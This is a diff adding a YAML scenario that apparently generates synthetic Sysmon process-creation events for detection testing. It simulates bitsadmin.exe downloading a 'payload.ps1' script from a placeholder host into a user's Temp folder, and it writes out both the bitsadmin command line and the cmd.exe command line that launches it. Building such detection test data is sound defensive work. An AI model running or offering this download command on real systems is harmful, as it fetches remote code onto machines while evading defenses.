@@ -1,0 +1,115 @@
+type: scenario
+description: |
+  Downloads a remote file with the native bitsadmin.exe utility run from a
+  command prompt -- directly with /transfer, or by staging a URL into a BITS
+  job with /addfile. The command line is a state parameter so a job can
+  drive the download verb per workload.
+tags: [eid1]
+mitre:
+  tactics: [command-and-control, defense-evasion]
+  techniques: [T1105, T1197]
+
+state:
+  domain_short:        CORP
+  domain_tld:          local
+  domain_short_lower:  fn.lower(ref.domain_short)
+  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
+  sysmon_pid:          gen.int(min=1000, max=4000)
+  sysmon_tid:          gen.int(min=1000, max=9999)
+  process_guid_raw:    gen.uuid()
+  process_guid:        "{${ref.process_guid_raw}}"
+  process_id:          gen.int(min=1000, max=9999)
+  parent_guid_raw:     gen.uuid()
+  parent_process_guid: "{${ref.parent_guid_raw}}"
+  parent_process_id:   gen.int(min=1000, max=9999)
+  logon_guid_raw:      gen.uuid()
+  logon_guid:          "{${ref.logon_guid_raw}}"
+  logon_id_hex:        gen.hex(len=6)
+  logon_id:            "0x${ref.logon_id_hex}"
+  event_record_id:     gen.int(min=5000, max=99999)
+  username:            gen.username()
+  user:                "${ref.domain_short}\\${ref.username}"
+  payload_url:         "https://downloads.example.net/pkg/payload.ps1"
+  temp_dir:            "C:\\Users\\${ref.username}\\AppData\\Local\\Temp"
+  image:               "C:\\Windows\\System32\\bitsadmin.exe"
+  file_version:        "7.8.14393.0 (rs1_release.160715-1616)"
+  description:         "BITS administration utility"
+  original_file_name:  bitsadmin.exe
+  hashes:              "MD5=F548717B821860C2B2242367732FE105,SHA256=E1057A20945BCE8F00C0BE5E3DB40C4A98AB33F42F4D2DF919AEDB0EF6651D6E,IMPHASH=CE0EB5030AA7D3C8606F11BBCA0BC912"
+  command_line:        "bitsadmin.exe  /transfer /Download /priority Foreground ${ref.payload_url} ${ref.temp_dir}\\payload.ps1"
+  current_directory:   "C:\\Users\\${ref.username}\\AppData\\Local\\Temp\\"
+  parent_image:        "C:\\Windows\\System32\\cmd.exe"
+  parent_command_line: '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /transfer /Download /priority Foreground ${ref.payload_url} %temp%\payload.ps1"'
+
+steps:
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.event_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.process_guid
+            - "@Name": ProcessId
+              "#text": ref.process_id
+            - "@Name": Image
+              "#text": ref.image
+            - "@Name": FileVersion
+              "#text": ref.file_version
+            - "@Name": Description
+              "#text": ref.description
+            - "@Name": Product
+              "#text": "Microsoft® Windows® Operating System"
+            - "@Name": Company
+              "#text": Microsoft Corporation
+            - "@Name": OriginalFileName
+              "#text": ref.original_file_name
+            - "@Name": CommandLine
+              "#text": ref.command_line
+            - "@Name": CurrentDirectory
+              "#text": ref.current_directory
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.logon_guid
+            - "@Name": LogonId
+              "#text": ref.logon_id
+            - "@Name": TerminalSessionId
+              "#text": 2
+            - "@Name": IntegrityLevel
+              "#text": High
+            - "@Name": Hashes
+              "#text": ref.hashes
+            - "@Name": ParentProcessGuid
+              "#text": ref.parent_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.parent_process_id
+            - "@Name": ParentImage
+              "#text": ref.parent_image
+            - "@Name": ParentCommandLine
+              "#text": ref.parent_command_line
